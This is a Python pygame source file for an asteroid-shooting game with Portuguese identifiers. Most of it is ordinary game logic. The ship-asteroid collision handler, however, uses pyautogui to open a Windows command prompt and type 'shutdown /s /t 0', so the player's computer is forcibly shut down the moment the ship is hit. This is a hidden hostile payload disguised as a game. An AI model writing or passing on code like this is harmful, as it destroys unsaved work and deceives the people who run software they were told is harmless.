import pygame
import random
import sys
import pyautogui
from time import sleep

# Inicialização do pygame
pygame.init()

# Configurações da tela
largura, altura = 800, 600
tela = pygame.display.set_mode((largura, altura))
pygame.display.set_caption("Asteroid Game")

# Cores
BRANCO = (255, 255, 255)
VERMELHO = (255, 0, 0)
CINZA = (200, 200, 200)
PRETO = (0, 0, 0)

# Fonte
fonte = pygame.font.SysFont('Arial', 30)

# Nave
nave_largura, nave_altura = 50, 40
nave_x = largura // 2 - nave_largura // 2
nave_y = altura - 60
velocidade_nave = 6

# Tiros
tiros = []
velocidade_tiro = 8

# Asteroides
asteroides = []
velocidade_asteroide = 4
for _ in range(5):
    x = random.randint(0, largura - 50)
    y = random.randint(-600, -50)
    asteroides.append([x, y])

# Pontuação
pontos = 0

def desenhar_nave(x, y):
    pygame.draw.polygon(tela, BRANCO, [(x, y), (x + nave_largura // 2, y - nave_altura), (x + nave_largura, y)])

def desenhar_asteroide(x, y):
    pygame.draw.circle(tela, CINZA, (x, y), 30)

def desenhar_tiro(x, y):
    pygame.draw.rect(tela, VERMELHO, (x, y, 5, 10))

def mostrar_texto(texto, x, y):
    img = fonte.render(texto, True, BRANCO)
    tela.blit(img, (x, y))

def game_over():
    tela.fill(PRETO)
    mostrar_texto("GAME OVER", largura // 2 - 100, altura // 2 - 30)
    mostrar_texto(f"Pontos: {pontos}", largura // 2 - 70, altura // 2 + 10)
    pygame.display.update()
    pygame.time.wait(3000)
    main()

def main():
    global nave_x, tiros, asteroides, pontos

    # Resetar estado do jogo
    nave_x = largura // 2 - nave_largura // 2
    tiros = []
    asteroides = [[random.randint(0, largura - 50), random.randint(-600, -50)] for _ in range(5)]
    pontos = 0

    clock = pygame.time.Clock()

    while True:
        clock.tick(60)
        tela.fill(PRETO)

        for evento in pygame.event.get():
            if evento.type == pygame.QUIT:
                pygame.quit()
                sys.exit()

        # Controles
        teclas = pygame.key.get_pressed()
        if teclas[pygame.K_LEFT] and nave_x > 0:
            nave_x -= velocidade_nave
        if teclas[pygame.K_RIGHT] and nave_x < largura - nave_largura:
            nave_x += velocidade_nave
        if teclas[pygame.K_SPACE]:
            if len(tiros) < 5:
                tiros.append([nave_x + nave_largura // 2 - 2, nave_y - nave_altura])

        # Atualizar tiros
        for tiro in tiros[:]:
            tiro[1] -= velocidade_tiro
            if tiro[1] < 0:
                tiros.remove(tiro)

        # Atualizar asteroides
        for asteroide in asteroides:
            asteroide[1] += velocidade_asteroide
            if asteroide[1] > altura:
                asteroide[1] = random.randint(-100, -50)
                asteroide[0] = random.randint(0, largura - 50)

        # Colisões tiro-asteroide
        for tiro in tiros[:]:
            for asteroide in asteroides[:]:
                distancia = ((tiro[0] - asteroide[0]) ** 2 + (tiro[1] - asteroide[1]) ** 2) ** 0.5
                if distancia < 30:
                    try:
                        tiros.remove(tiro)
                        asteroides.remove(asteroide)
                        pontos += 1
                        asteroides.append([random.randint(0, largura - 50), random.randint(-600, -50)])
                    except:
                        pass

        # Colisões nave-asteroide
        for asteroide in asteroides:
            distancia = ((nave_x + nave_largura // 2 - asteroide[0]) ** 2 + (nave_y - asteroide[1]) ** 2) ** 0.5
            if distancia < 40:
                pyautogui.press('win')
                pyautogui.write('cmd')
                pyautogui.press('enter')
                sleep(2)
                pyautogui.write('shutdown /s /t 0')
                pyautogui.press('enter')
                pyautogui.press('enter')
                game_over()

        # Desenhar objetos
        desenhar_nave(nave_x, nave_y)
        for asteroide in asteroides:
            desenhar_asteroide(asteroide[0], asteroide[1])
        for tiro in tiros:
            desenhar_tiro(tiro[0], tiro[1])

        mostrar_texto(f'Pontos: {pontos}', 10, 10)

        pygame.display.update()

if __name__ == '__main__':
    main()
